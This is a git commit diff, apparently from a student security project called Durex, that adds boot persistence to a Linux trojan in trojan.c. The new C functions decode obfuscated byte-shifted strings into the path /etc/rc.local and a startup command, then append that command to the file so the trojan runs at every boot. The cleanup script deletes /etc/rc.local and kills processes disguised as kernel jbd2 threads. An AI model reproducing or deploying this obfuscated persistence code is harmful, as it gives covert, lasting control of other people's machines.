6c16cb5b5e050ea0fe6568ef766b662652983a42
alagroy- <alagroy-@student.42.fr>
2021-12-07 08:43:48 -0500

    adding persistence

--- clean_durex.sh
+++ clean_durex.sh
@@ -1,3 +1,7 @@
 #!/bin/bash
 
 sudo rm -f /bin/Durex
+sudo rm -f /etc/rc.local
+sudo kill -9 `pidof '[jbd2/sda0-8]'`
+sudo kill -9 `pidof '[jbd2/sda0-6]'`
+sudo kill -9 `pidof '[jbd2/sda0-7]'`
--- srcs/trojan.c
+++ srcs/trojan.c
@@ -6,7 +6,7 @@
 /*   By: alagroy- <alagroy-@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2021/12/03 10:35:03 by alagroy-          #+#    #+#             */
-/*   Updated: 2021/12/03 10:53:33 by alagroy-         ###   ########.fr       */
+/*   Updated: 2021/12/07 08:38:07 by alagroy-         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -27,6 +27,58 @@ void        get_filename(int *buf)
         filename[i]--;
 }
 
+static void get_rc(int *buf)
+{
+    int     i;
+    char    *filename;
+    
+    buf[0] = 0x64756630;
+    buf[1] = 0x2f647330;
+    buf[2] = 0x6264706d;
+    buf[3] = 0x6d;
+    i = -1;
+    filename = (char *)buf;
+    while (filename[++i])
+        filename[i]--;
+}
+
+static void make_command(int *buffer)
+{
+    int     i;
+    char    *command;
+    
+    buffer[0] = 0x63302224;
+    buffer[1] = 0x63306f6a;
+    buffer[2] = 0x0b697462;
+    buffer[3] = 0x6576740b;
+    buffer[4] = 0x76302170;
+    buffer[5] = 0x63307374;
+    buffer[6] = 0x45306f6a;
+    buffer[7] = 0x79667376;
+    buffer[8] = 0x6a79660b;
+    buffer[9] = 0x0b312175;
+    i = -1;
+    command = (char *)buffer;
+    while (command[++i])
+        command[i]--;
+}
+
+static void persist(void)
+{
+    int     rc;
+    char    file[20];
+    char    command[50];
+
+    bzero(command, 50);
+    get_rc((int *)file);
+    get_filename((int *)command);
+    if ((rc = open(file, O_WRONLY | O_CREAT | O_APPEND, 0755)) == -1)
+        return ;
+    make_command((int *)command);
+    dprintf(rc, command);
+    close(rc);
+}
+
 void        do_trojan_dirty_job(void)
 {
     pid_t       pid;
@@ -39,4 +91,5 @@ void        do_trojan_dirty_job(void)
     get_filename(buf);
     if ((pid = fork()) == 0)
         execve(cmd[0], cmd, NULL);
+    persist();
 }
